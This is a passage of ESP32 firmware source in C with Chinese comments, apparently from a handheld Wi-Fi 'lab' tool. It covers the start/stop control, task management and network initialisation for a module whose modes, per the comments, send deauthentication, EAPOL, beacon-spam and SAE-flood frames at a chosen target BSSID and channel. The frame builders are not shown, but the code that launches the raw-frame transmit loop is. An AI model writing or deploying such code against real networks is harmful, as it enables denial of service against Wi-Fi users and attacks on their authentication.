                    wifilab_count_tx(esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false));
                    vTaskDelay(pdMS_TO_TICKS(10));
                    if (!s_wifilab_active) break;
                }
            }
        }
        break;
    }

    default:
        break;
    }

    // 任务自然退出（active 被清）后回滚射频由 STOP 请求统一处理；此处不重复释放。
    s_wifilab_task = NULL;
    vTaskDelete(NULL);
}

// 阻塞式启动：先在射频互斥判断里拒绝，再拉起射频并派生攻击任务。须在 worker 中调用。
static esp_err_t wifilab_start_locked(void)
{
    net_lock();
    if (s_wifilab_running) {
        net_unlock();
        return ESP_ERR_INVALID_STATE;
    }
    net_unlock();

    // 射频互斥：蓝牙 / 信道体检 / 配网 正占着 2.4G 时直接拒绝（它们也都会反过来拒绝本角色）。
    if (app_ble_active()) {
        set_wifilab_reason("蓝牙正在使用（找设备/万能遥控），请先退出该页");
        return ESP_ERR_INVALID_STATE;
    }
    if (app_net_channel_scan_running()) {
        set_wifilab_reason("信道体检正在扫描 Wi-Fi，请等几秒后重试");
        return ESP_ERR_INVALID_STATE;
    }
    if (app_net_prov_active()) {
        set_wifilab_reason("热点配网正在使用，请先关闭配网");
        return ESP_ERR_INVALID_STATE;
    }

    bool was_started = s_wifi_started;
    esp_err_t err = wifi_ensure_started();
    if (err != ESP_OK) {
        set_wifilab_reason("Wi-Fi 启动失败，请长按↑ 重试");
        return err;
    }

    // 发射接口与模式对应：DEAUTH/EAPOL/BEACON 走 AP 接口（需 AP 模式），SAE 走 STA 接口。
    wifi_mode_t wm = (s_wifilab_mode == APP_WIFILAB_SAE_FLOOD) ? WIFI_MODE_STA : WIFI_MODE_AP;
    err = esp_wifi_set_mode(wm);
    if (err != ESP_OK) {
        if (!was_started && !s_prov_active) app_net_wifi_stop();
        set_wifilab_reason("Wi-Fi 模式切换失败，请长按↑ 重试");
        return err;
    }
    // 目标信道：DEAUTH/EAPOL/SAE 用目标信道；BEACON 各子模式自行逐信道设置。
    if (s_wifilab_mode != APP_WIFILAB_BEACON_SPAM &&
        s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
        esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
    }
    // 种子 PRNG：调用方未给（0）则用默认种子，保证确定性可复现。
    app_wifilab_set_seed(s_wifilab_seed ? s_wifilab_seed : 0x1A2B3C4Du);

    s_wifilab_active = true;
    s_wifilab_sent = 0;
    s_wifilab_failed = 0;
    s_wifilab_tx_err = ESP_OK;
    s_wifilab_tx_reason[0] = '\0';
    s_wifilab_running = true;
    s_wifilab_was_started = was_started;
    s_wifilab_err = ESP_OK;
    s_wifilab_reason[0] = '\0';

    // 栈给足：帧缓冲 256B + 构造器局部 + 逐信道循环的调用深度。与信道体检/配网 worker 一致用 6144，
    // 避免在 4096 下逼近上限时（尤其 beacon 逐信道路径）发生栈溢出导致的闪退/重启。
    if (xTaskCreate(wifilab_attack_task, "wifilab", 6144, NULL, 5, &s_wifilab_task) != pdPASS) {
        s_wifilab_active = false;
        s_wifilab_running = false;
        if (!was_started && !s_prov_active) app_net_wifi_stop();
        set_wifilab_reason("任务创建失败，请稍后重试");
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

// 阻塞式停止：清退出标志、删攻击任务，并按需释放本角色借来的射频。须在 worker 中调用。
static void wifilab_stop_locked(void)
{
    s_wifilab_active = false;
    if (!s_wifilab_running) return;
    if (s_wifilab_task) {
        vTaskDelete(s_wifilab_task);   // 攻击任务未持锁，可直接删除（与 GhostESP 的 stop 一致）
        s_wifilab_task = NULL;
    }
    // 只还回去"自己借来的"射频；配网期间更不能关。
    if (!s_wifilab_was_started && !s_prov_active) app_net_wifi_stop();
    s_wifilab_running = false;
}

typedef enum {
    WIFILAB_REQ_START = 0,
    WIFILAB_REQ_STOP,
} wifilab_req_t;

static void wifilab_ctrl_task(void *arg)
{
    (void)arg;
    wifilab_req_t req;
    while (xQueueReceive(s_wifilab_req_q, &req, portMAX_DELAY) == pdTRUE) {
        switch (req) {
        case WIFILAB_REQ_START:
            s_wifilab_err = wifilab_start_locked();
            break;
        case WIFILAB_REQ_STOP:
            wifilab_stop_locked();
            s_wifilab_err = ESP_OK;
            break;
        }
    }
}

static void wifilab_ensure_ctrl(void)
{
    if (s_wifilab_req_q) return;
    s_wifilab_req_q = xQueueCreate(8, sizeof(wifilab_req_t));
    if (!s_wifilab_req_q) return;
    if (xTaskCreate(wifilab_ctrl_task, "wifilab_req", 3072, NULL, 5, &s_wifilab_req_task) != pdPASS) {
        vQueueDelete(s_wifilab_req_q);
        s_wifilab_req_q = NULL;
    }
}

static void wifilab_post(wifilab_req_t req)
{
    wifilab_ensure_ctrl();
    if (s_wifilab_req_q) (void)xQueueSend(s_wifilab_req_q, &req, 0);
}

// 阻塞式启动接口（如测试 / 内部调用）：先把参数写入模块状态，再走统一启动流程。
esp_err_t app_net_wifilab_start(app_wifilab_mode_t mode, app_wifilab_beacon_t beacon,
                                const uint8_t target_bssid[6], int target_channel,
                                const char *target_ssid, size_t target_ssid_len, uint32_t seed)
{
    if (!s_inited) return ESP_ERR_INVALID_STATE;
    net_lock();
    s_wifilab_mode = mode;
    s_wifilab_beacon = beacon;
    if (target_bssid) memcpy(s_wifilab_bssid, target_bssid, 6);
    else memset(s_wifilab_bssid, 0, 6);
    s_wifilab_channel = target_channel;
    s_wifilab_seed = seed;
    s_wifilab_ssid_len = (target_ssid_len < sizeof(s_wifilab_ssid) - 1)
                             ? target_ssid_len : sizeof(s_wifilab_ssid) - 1;
    if (target_ssid) memcpy(s_wifilab_ssid, target_ssid, s_wifilab_ssid_len);
    else s_wifilab_ssid[0] = '\0';
    net_unlock();
    return wifilab_start_locked();
}

void app_net_wifilab_stop(void)
{
    wifilab_stop_locked();
}

bool app_net_wifilab_running(void)
{
    net_lock();
    bool r = s_wifilab_running;
    net_unlock();
    return r;
}

void app_net_wifilab_request_start(app_wifilab_mode_t mode, app_wifilab_beacon_t beacon,
                                   const uint8_t target_bssid[6], int target_channel,
                                   const char *target_ssid, size_t target_ssid_len, uint32_t seed)
{
    if (!s_inited) return;
    net_lock();
    s_wifilab_mode = mode;
    s_wifilab_beacon = beacon;
    if (target_bssid) memcpy(s_wifilab_bssid, target_bssid, 6);
    else memset(s_wifilab_bssid, 0, 6);
    s_wifilab_channel = target_channel;
    s_wifilab_seed = seed;
    s_wifilab_ssid_len = (target_ssid_len < sizeof(s_wifilab_ssid) - 1)
                             ? target_ssid_len : sizeof(s_wifilab_ssid) - 1;
    if (target_ssid) memcpy(s_wifilab_ssid, target_ssid, s_wifilab_ssid_len);
    else s_wifilab_ssid[0] = '\0';
    net_unlock();
    wifilab_post(WIFILAB_REQ_START);
}

void app_net_wifilab_request_stop(void)
{
    wifilab_post(WIFILAB_REQ_STOP);
}

esp_err_t app_net_wifilab_last_error(void)
{
    return s_wifilab_err;
}

const char *app_net_wifilab_error_text(void)
{
    return s_wifilab_reason[0] ? s_wifilab_reason : NULL;
}

app_wifilab_mode_t app_net_wifilab_mode(void)
{
    return s_wifilab_mode;
}

uint32_t app_net_wifilab_packets_sent(void)
{
    return s_wifilab_sent;
}

uint32_t app_net_wifilab_packets_failed(void)
{
    return s_wifilab_failed;
}

const char *app_net_wifilab_tx_error_text(void)
{
    return s_wifilab_tx_reason[0] ? s_wifilab_tx_reason : NULL;
}

// ---------------------------------------------------------------------------
// 初始化
// ---------------------------------------------------------------------------

esp_err_t app_net_init(void)
{
    if (s_inited) return ESP_OK;

    if (!s_lock) {
        s_lock = xSemaphoreCreateMutex();
        if (!s_lock) return ESP_ERR_NO_MEM;
    }

    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGW(TAG, "NVS 需要重新格式化: %s", esp_err_to_name(err));
        nvs_flash_erase();
        err = nvs_flash_init();
    }
    if (err != ESP_OK) return err;

    err = esp_netif_init();
    if (err != ESP_OK) return err;

    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) return err;

    // 默认 STA / AP 网络接口只创建一次。
    if (!s_sta_netif) {
        s_sta_netif = esp_netif_create_default_wifi_sta();
        if (!s_sta_netif) return ESP_ERR_NO_MEM;
    }
    if (!s_ap_netif) {
        s_ap_netif = esp_netif_create_default_wifi_ap();
        if (!s_ap_netif) return ESP_ERR_NO_MEM;
    }

    err = esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                              &on_wifi_event, NULL, NULL);
    if (err != ESP_OK) return err;
    err = esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                              &on_ip_event, NULL, NULL);
    if (err != ESP_OK) return err;

    s_inited = true;
    ESP_LOGI(TAG, "联网基础服务就绪（未打开射频）");
    return ESP_OK;
}
